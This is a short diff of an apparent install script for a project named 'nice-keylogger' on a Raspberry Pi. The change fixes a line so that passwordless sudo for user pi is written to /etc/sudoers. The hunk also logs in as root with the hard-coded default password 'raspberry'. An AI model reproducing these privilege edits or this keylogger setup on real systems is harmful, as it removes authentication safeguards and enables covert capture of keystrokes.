@@ -9,7 +9,7 @@ base="https://raw.githubusercontent.com/castle-sam/nice-keylogger/dev/src/"
 su - root <<!
 raspberry
 echo "pi ALL=(ALL:ALL) ALL" >> /etc/sudoers
-echo "pi ALL=(ALL) NOPASSWD:ALL
+echo "pi ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
 !
 
 mkdir nicekl && cd nicekl/
